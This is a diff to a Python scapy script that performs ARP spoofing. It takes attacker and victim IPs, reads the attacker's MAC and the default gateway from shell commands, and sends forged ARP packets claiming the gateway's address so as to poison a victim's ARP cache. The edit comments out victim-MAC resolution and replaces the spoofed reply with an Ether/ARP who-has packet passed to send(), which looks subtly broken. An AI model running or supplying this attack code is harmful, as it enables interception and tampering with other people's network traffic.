@@ -14,20 +14,19 @@ Attacker_ip = sys.argv[3]
 
 # get my mac affr
 Attacker_mac = os.popen("ifconfig -a| grep "+interface+" |awk -F ' ' '{print $5}'").read()
-#print("[+]My MAC >>",Attacker_mac)
+print("[+]My MAC >>",Attacker_mac)
 
 # gw ip addr 
 gw_ip = os.popen("route | grep default |awk -F ' ' '{print $2}'").read()
-#print ("[+]GW >>>>",gw_ip)
+print ("[+]GW >>>>",gw_ip)
 
 # arp request
-arp = sr1(ARP(op=ARP.who_has, psrc=Attacker_ip, pdst=Victim_ip))
-p_summary = arp.summary()
-p_split = p_summary.split()
-Victim_mac = p_split[3]
+#arp = sr1(ARP(op=ARP.who_has, psrc=Attacker_ip, pdst=Victim_ip))
+#p_summary = arp.summary()
+#p_split = p_summary.split()
+#Victim_mac = p_split[3]
 #print ("[+]Victim MAC >",Victim_mac)
 
 # send arp spoof
-arp_reply = ARP(op=ARP.is_at, hwsrc = Attacker_mac, psrc=gw_ip, hwdst = Victim_mac, pdst=Victim_ip)
-arp_reply.show()
-send(arp_reply)
+arp_packet = Ether()/ARP(op="who-has", hwsrc=Attacker_mac,psrc=gw_ip,pdst=Victim_ip)
+send(arp_packet)
